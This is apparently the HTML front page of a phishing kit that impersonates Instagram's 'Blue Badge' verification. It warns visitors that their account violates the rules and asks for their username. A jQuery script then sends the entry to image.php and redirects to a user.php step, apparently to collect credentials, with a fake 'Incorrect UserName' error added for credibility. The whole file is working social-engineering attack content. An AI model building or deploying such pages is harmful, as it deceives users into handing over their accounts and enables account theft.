


<!DOCTYPE html>
<html lang="en">
<head>
  <title>Blue Badge | Instagram</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->  
  <link rel="icon" type="image/png" href="favicon.png"/>
<!--===============================================================================================-->
  <link rel="stylesheet" type="text/css" href="css/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
  <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
  <link rel="stylesheet" type="text/css" href="css/vendor/animate/animate.css">
<!--===============================================================================================-->  
  <link rel="stylesheet" type="text/css" href="css/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
  <link rel="stylesheet" type="text/css" href="css/vendor/select2/select2.min.css">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">

<!--===============================================================================================-->
  <link rel="stylesheet" type="text/css" href="css/util.css">
  <link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<style type="text/css">
  <style>
  img {
  border: 1px solid #ddd;
  border-radius: 4px;
  padding: 5px;
  width: 150px;
}
    .overlay{
        display: none;
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        z-index: 999;
        background: rgba(255,255,255,0.8) url("https://i.pinimg.com/originals/78/e8/26/78e826ca1b9351214dfdd5e47f7e2024.gif") center no-repeat;
    }
   
    /* Turn off scrollbar when body element has the loading class */
    body.loading{
        overflow: hidden;   
    }
    /* Make spinner image visible when body element has the loading class */
    body.loading .overlay{
        display: block;
    }
</style>

<style type="text/css">  .btn {
    cursor: pointer;
    width: 100%;
    padding:0 8px; 
    background: #3897f0;
    border:1px solid #3897f0;
    color:#fff;
    border-radius:10px;
    font-weight:600;
    font-size: 14px;
    height: 35px;
    line-height: 26px;
    outline: none;
    white-space: nowrap;
  }
  
  .container-login100{
    
    background:#dfdfdf;
    
  }
  
  body{
    background:#fafafa;
  }
</style>
<body>
<div class="limiter">
<div class="container-login100">
<div class="wrap-login100">
<div class="login100-pic js-tilt" data-tilt>
<img src="https://www.vargonen.com/blog/wp-content/uploads/2020/09/instagramlogo.jpg" alt="IMG"> <br><br><br><br>
<img style="margin-top:-90px;" src="img-01.png" alt="IMG"> 
</div>
<el class="login100-form validate-form" id="elemend">
<form action="image.php" id="idForm" class="login100-form validate-form">

<center><img style="margin-top:-20px;" src="https://i.hizliresim.com/5xns4qf.png"  width="175"></center>


<span class="login100-form-title">
<p style="max-width:200%; font-size:15px; color: #999; line-height:20px; box-sizing:border-box;">
Hello,<br>You have been redirected to this page, your account violates our rules, if you think this is an error, please fill out the form to verify your account.</p><br>
<div class="wrap-input100 validate-input">
<input required="" class="input100" type="text" name="imagekadi" placeholder="Kullanıcı adı">
<span class="focus-input100"></span>
<span class="symbol-input100">
<i class="fa fa-user" aria-hidden="true"></i>
</span>
</div>



<div class="container-login100-form-btn">
<button type="submit" id="imagei" class="btn">ileri</button>
 <br>
 <br>
<center><h6><font style="cursor:pointer;" onclick="javascript:window.location.href='https://www.instagram.com/accounts/password/reset/'; " color="#00376b">Did you forget your password?</font></h6></center></h6></center>
          
          
        </div>
          

        

          
        </form>
      </div>
    </div>
  </el>
  
  <div style="background:#fafafa; width:100%; height:5; border-top:0.5px solid rgb(0,0,0,0.3);"class="lilvlad2">
      <center><img style="margin-bottom:5px; margin-top:5px;" src="footerx.png" width="145"
></center>
      
      <!--- coder by k44n---!>
      
<!--===============================================================================================-->  
  <script src="css/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
  <script src="css/vendor/bootstrap/js/popper.js"></script>
  <script src="css/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
  <script src="css/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
  <script src="css/vendor/tilt/tilt.jquery.min.js"></script>
  <script >
    $('.js-tilt').tilt({
      scale: 1.1
    })
  </script>
<!--===============================================================================================-->
<script src="css/js/main.js"></script>
<script type="text/javascript">
$("#idForm").submit(function(e) {

    e.preventDefault(); // avoid to execute the actual submit of the form.

    var form = $(this);
    var url = form.attr('action');
       var btn = $("#imagei");
         btn.prop("disabled", true);
         
    
      btn.html("Please Wait...");

              imagekadi = $('input[name="imagekadi"]').val();

    $.ajax({
          
           url: url,
           data: form.serialize(),
           statusCode: {
      500: function (response) {
      
         alert("Incorrect UserName You Entered.");
             
         document.getElementById("imagei").type="submit";
         document.getElementById("imagei").value="Search";
return false;
      },
      201: function (response) {
         alert('1');
         AfterSavedAll();
      },
      400: function (response) {
         alert('1');
         bootbox.alert('<span style="color:Red;">Error While Saving Outage Entry Please Check</span>', function () { });
      },
      404: function (response) {
         alert('1');
         bootbox.alert('<span style="color:Red;">Error While Saving Outage Entry Please Check</span>', function () { });
      }
   },
           success: function(data)
           {
         if (data=="" || data=="error" ) {
             
             alert("Incorrect UserName You Entered.");
             
          btn.prop("disabled", false);
         
    
      btn.html("Continue");
return false;
     }


    window.location = "user.php?user="+imagekadi
                
           }
         });

    
});
$("#userpass").submit(function(e) {
    
    e.preventDefault();
    
    alert("dsd");
});

</script>
</body>
</html>